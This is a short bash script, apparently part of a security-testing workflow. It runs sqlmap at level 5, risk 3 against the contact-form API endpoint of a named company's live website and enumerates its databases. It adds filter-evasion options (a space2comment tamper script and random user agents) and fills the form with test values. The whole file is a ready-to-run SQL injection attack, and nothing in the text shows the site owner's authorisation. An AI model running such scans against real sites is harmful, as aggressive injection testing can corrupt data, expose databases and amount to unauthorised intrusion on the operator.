#!/bin/bash
# SQLmap level=5 risk=3 against POST /api/send - all parameters
cd "$(dirname "$0")" || exit 1
mkdir -p tool_outputs
AT=$(python3 -c "import urllib.parse;print(urllib.parse.quote(chr(64),safe=''))")
TO="sqli%2Btest${AT}mailinator.com"
U="https://www.infinitycapital.bh/api/send"
DATA="fname=base&lname=Test&areacode=973&tel=5551234&cname=QATester&subject=Hi&msg=Body+text&check=on&targets=${TO}"

echo "===== TARGET: $U  DATA: $DATA"
sqlmap -u "$U" --data="$DATA" \
  --method=POST --batch --level=5 --risk=3 --dbs --threads=4 \
  --tamper=space2comment --random-agent --timeout=20 --retries=1 \
  --output-dir=tool_outputs/sqlmap_send \
  --flush-session \
  --headers="Content-Type: application/x-www-form-urlencoded|Accept: application/json" \
  2>&1 | tail -80
